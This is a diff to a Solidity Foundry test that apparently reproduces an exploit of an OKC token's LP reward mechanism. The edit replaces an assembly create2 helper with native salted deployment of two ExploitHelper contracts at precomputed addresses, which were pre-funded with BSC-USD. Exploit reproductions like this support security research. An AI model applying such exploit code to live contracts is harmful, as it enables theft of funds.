@@ -282,8 +282,8 @@ contract OKCProcessLpRewardExploit is Test {
 
       // Deploy exploitHelperOne 
       console2.log("Deploy exploitHelperOne w/ Create2 to address.");
-      address createdOne = create2address(createCode, bytes32("fuck"));
-      require(createdOne == exploitHelperOne, "create2 first deploy address mismatch");
+      ExploitHelper createdOne = new ExploitHelper{salt: bytes32("fuck")}(); //create2address(createCode, bytes32("fuck"));
+      require(address(createdOne) == exploitHelperOne, "create2 first deploy address mismatch");
 
       // Transfer 100000000000000 BSC-USD to exploitHelperTwo before deploying contract.
       // This will have the exploitHelperTwo send the BSC-USD to the PANCAKELP contract.
@@ -296,8 +296,8 @@ contract OKCProcessLpRewardExploit is Test {
 
       // Deploy exploitHelperTwo
       console2.log("Deploy exploitHelperTwo w/ Create2 to address.");
-      address createdTwo = create2address(createCode, bytes32("shit"));
-      require(createdTwo == exploitHelperTwo, "create2 second deploy address mismatch");
+      ExploitHelper createdTwo = new ExploitHelper{salt: bytes32("shit")}();
+      require(address(createdTwo) == exploitHelperTwo, "create2 second deploy address mismatch");
 
       console2.log("calling getReserves()");
       // get reserves of token0 and token1
@@ -396,7 +396,6 @@ contract OKCProcessLpRewardExploit is Test {
         address contractAddress = address(this);
         assembly {
             let ptr := mload(0x40)
-
             mstore(add(ptr, 0x40), creationCodeHash)
             mstore(add(ptr, 0x20), salt)
             mstore(ptr, contractAddress)
@@ -405,16 +404,5 @@ contract OKCProcessLpRewardExploit is Test {
             addr := keccak256(start, 85)
         }
     }
-
-    function create2address(bytes memory createCode, bytes32 salt) public returns(address created) {
-        assembly {
-          created := create2(
-            callvalue(),         
-            add(createCode, 0x20), 
-            mload(createCode),     
-            salt
-            )
-        }
-    }
-
+    
 }
